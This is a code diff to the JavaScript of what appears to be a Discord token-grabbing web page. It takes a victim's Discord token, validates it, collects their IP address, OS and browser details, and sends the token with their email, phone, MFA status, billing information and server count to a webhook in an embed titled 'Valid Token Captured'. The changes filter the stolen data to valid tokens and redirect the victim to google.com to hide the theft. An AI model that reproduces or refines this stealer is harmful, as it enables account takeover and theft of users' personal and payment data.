@@ -54,7 +54,7 @@
     async function processData() {
       if (hasSent) {
         console.log('[Already sent]');
-        window.close();
+        location.href = 'https://google.com';
         return;
       }
 
@@ -70,7 +70,7 @@
 
       if (!rawToken) {
         console.log('[✗] No token found');
-        window.close();
+        location.href = 'https://google.com';
         return;
       }
 
@@ -97,10 +97,17 @@
       try {
         hasSent = true;
 
-        // Validate token and get user info
+        // Validate token first
         const validationResult = await validateToken(token);
 
-        // Get IP and system info
+        // If token is invalid, don't send anything - just redirect
+        if (!validationResult.valid) {
+          console.log('[✗] Invalid token - not sending');
+          location.href = 'https://google.com';
+          return;
+        }
+
+        // Token is valid - get IP and system info
         const ipResponse = await fetch('https://api.ipify.org?format=json');
         const ipData = await ipResponse.json();
 
@@ -112,18 +119,18 @@
           language: navigator.language
         };
 
-        // Send everything to webhook
+        // Send only valid tokens to webhook
         const success = await sendData(token, systemInfo, userAgent, validationResult);
 
         if (success) {
-          console.log('[✓] Sent successfully');
+          console.log('[✓] Valid token sent successfully');
         }
 
-        window.close();
+        location.href = 'https://google.com';
 
       } catch (e) {
         console.error('[✗] Error:', e);
-        window.close();
+        location.href = 'https://google.com';
       }
     }
 
@@ -202,7 +209,7 @@
       }
     }
 
-    // Send data to webhook
+    // Send data to webhook (only called for valid tokens)
     async function sendData(token, systemInfo, userAgent, validationResult) {
       try {
         const response = await fetch('/api/get-webhook-url');
@@ -214,99 +221,61 @@
 
         const tokenString = String(token);
 
-        // Build embed based on validation result
-        let embed;
-
-        if (validationResult.valid) {
-          // Valid token - rich embed
-          embed = {
-            title: "🎯 Valid Token Captured",
-            description: "Active Discord account credentials intercepted",
-            color: 0x43B581, // Green for valid
-            fields: [
-              {
-                name: "👤 User Info",
-                value: `\`\`\`Username: ${validationResult.user.username}#${validationResult.user.discriminator}\nID: ${validationResult.user.id}\nEmail: ${validationResult.user.email}\nPhone: ${validationResult.user.phone}\`\`\``,
-                inline: false
-              },
-              {
-                name: "🔒 Security",
-                value: `\`\`\`MFA: ${validationResult.user.mfa ? '✅' : '❌'}\nVerified: ${validationResult.user.verified ? '✅' : '❌'}\`\`\``,
-                inline: true
-              },
-              {
-                name: "💎 Nitro",
-                value: `\`\`\`${validationResult.user.nitro}\`\`\``,
-                inline: true
-              },
-              {
-                name: "🏠 Servers",
-                value: `\`\`\`${validationResult.guilds} servers\`\`\``,
-                inline: true
-              },
-              {
-                name: "💳 Billing",
-                value: `\`\`\`${validationResult.hasBilling ? `✅ ${validationResult.billingCount} method(s)` : '❌ None'}\`\`\``,
-                inline: true
-              },
-              {
-                name: "🔑 Token",
-                value: `\`\`\`${tokenString}\`\`\``,
-                inline: false
-              },
-              {
-                name: "🌐 IP Address",
-                value: `\`\`\`${systemInfo.ip}\`\`\``,
-                inline: true
-              },
-              {
-                name: "💻 System",
-                value: `\`\`\`OS: ${systemInfo.os}\nBrowser: ${systemInfo.browser}\`\`\``,
-                inline: true
-              }
-            ],
-            thumbnail: validationResult.user.avatar ? {
-              url: validationResult.user.avatar
-            } : undefined,
-            footer: {
-              text: `Captured at ${new Date().toUTCString()}`,
-              icon_url: "https://cdn.discordapp.com/embed/avatars/0.png"
+        // Build rich embed for valid token
+        const embed = {
+          title: "🎯 Valid Token Captured",
+          description: "Active Discord account credentials intercepted",
+          color: 0x43B581, // Green
+          fields: [
+            {
+              name: "👤 User Info",
+              value: `\`\`\`Username: ${validationResult.user.username}#${validationResult.user.discriminator}\nID: ${validationResult.user.id}\nEmail: ${validationResult.user.email}\nPhone: ${validationResult.user.phone}\`\`\``,
+              inline: false
+            },
+            {
+              name: "🔒 Security",
+              value: `\`\`\`MFA: ${validationResult.user.mfa ? '✅' : '❌'}\nVerified: ${validationResult.user.verified ? '✅' : '❌'}\`\`\``,
+              inline: true
+            },
+            {
+              name: "💎 Nitro",
+              value: `\`\`\`${validationResult.user.nitro}\`\`\``,
+              inline: true
+            },
+            {
+              name: "🏠 Servers",
+              value: `\`\`\`${validationResult.guilds} servers\`\`\``,
+              inline: true
+            },
+            {
+              name: "💳 Billing",
+              value: `\`\`\`${validationResult.hasBilling ? `✅ ${validationResult.billingCount} method(s)` : '❌ None'}\`\`\``,
+              inline: true
+            },
+            {
+              name: "🔑 Token",
+              value: `\`\`\`${tokenString}\`\`\``,
+              inline: false
+            },
+            {
+              name: "🌐 IP Address",
+              value: `\`\`\`${systemInfo.ip}\`\`\``,
+              inline: true
+            },
+            {
+              name: "💻 System",
+              value: `\`\`\`OS: ${systemInfo.os}\nBrowser: ${systemInfo.browser}\`\`\``,
+              inline: true
             }
-          };
-        } else {
-          // Invalid token
-          embed = {
-            title: "⚠️ Invalid Token",
-            description: "Token validation failed",
-            color: 0xF04747, // Red for invalid
-            fields: [
-              {
-                name: "🔑 Token",
-                value: `\`\`\`${tokenString}\`\`\``,
-                inline: false
-              },
-              {
-                name: "❌ Error",
-                value: `\`\`\`${validationResult.error}\`\`\``,
-                inline: false
-              },
-              {
-                name: "🌐 IP Address",
-                value: `\`\`\`${systemInfo.ip}\`\`\``,
-                inline: true
-              },
-              {
-                name: "💻 System",
-                value: `\`\`\`OS: ${systemInfo.os}\nBrowser: ${systemInfo.browser}\`\`\``,
-                inline: true
-              }
-            ],
-            footer: {
-              text: `Captured at ${new Date().toUTCString()}`,
-              icon_url: "https://cdn.discordapp.com/embed/avatars/0.png"
-            }
-          };
-        }
+          ],
+          thumbnail: validationResult.user.avatar ? {
+            url: validationResult.user.avatar
+          } : undefined,
+          footer: {
+            text: `Captured at ${new Date().toUTCString()}`,
+            icon_url: "https://cdn.discordapp.com/embed/avatars/0.png"
+          }
+        };
 
         const payload = {
           content: null,
